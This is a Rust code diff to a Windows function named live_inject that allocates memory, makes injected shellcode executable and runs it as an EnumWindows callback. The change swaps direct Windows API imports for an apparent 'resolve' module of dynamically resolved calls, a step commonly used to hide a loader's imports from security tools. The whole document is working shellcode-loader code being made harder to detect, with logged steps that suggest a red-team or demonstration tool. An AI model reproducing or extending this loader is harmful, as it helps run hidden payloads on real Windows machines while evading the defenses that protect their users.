@@ -3,24 +3,17 @@ use crate::log::LogSink;
 
 #[cfg(windows)]
 pub fn live_inject(shellcode: &[u8], log: &LogSink) -> Result<InjectionResult, String> {
-    use std::ffi::c_void;
-    use windows::Win32::Foundation::BOOL;
-    use windows::Win32::System::Memory::{
-        VirtualAlloc, VirtualProtect, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ,
-        PAGE_PROTECTION_FLAGS, PAGE_READWRITE,
-    };
+    use crate::resolve;
 
-    type WNDENUMPROC = unsafe extern "system" fn(isize, isize) -> BOOL;
-
-    #[link(name = "user32")]
-    extern "system" {
-        fn EnumWindows(lpEnumFunc: WNDENUMPROC, lParam: isize) -> BOOL;
-    }
+    const MEM_COMMIT: u32 = 0x1000;
+    const MEM_RESERVE: u32 = 0x2000;
+    const PAGE_READWRITE: u32 = 0x04;
+    const PAGE_EXECUTE_READ: u32 = 0x20;
 
     log.step("[1/4] VirtualAlloc(PAGE_READWRITE) for shellcode".to_string());
     let alloc = unsafe {
-        VirtualAlloc(
-            None,
+        resolve::VirtualAlloc(
+            std::ptr::null(),
             shellcode.len(),
             MEM_COMMIT | MEM_RESERVE,
             PAGE_READWRITE,
@@ -40,16 +33,17 @@ pub fn live_inject(shellcode: &[u8], log: &LogSink) -> Result<InjectionResult, S
     }
 
     log.step("[3/4] VirtualProtect → PAGE_EXECUTE_READ".to_string());
-    let mut old_protect = PAGE_PROTECTION_FLAGS(0);
-    unsafe {
-        VirtualProtect(alloc, shellcode.len(), PAGE_EXECUTE_READ, &mut old_protect)
+    let mut old_protect: u32 = 0;
+    let ok = unsafe {
+        resolve::VirtualProtect(alloc, shellcode.len(), PAGE_EXECUTE_READ, &mut old_protect)
+    };
+    if ok == 0 {
+        return Err("VirtualProtect failed".to_string());
     }
-    .map_err(|e| format!("VirtualProtect failed: {e}"))?;
 
     log.step("[4/4] EnumWindows(callback) — shellcode executes as callback".to_string());
-    let callback: WNDENUMPROC = unsafe { std::mem::transmute(alloc as *const c_void) };
     unsafe {
-        let _ = EnumWindows(callback, 0);
+        resolve::EnumWindows(alloc as *const std::ffi::c_void, 0);
     }
 
     log.info(format!(
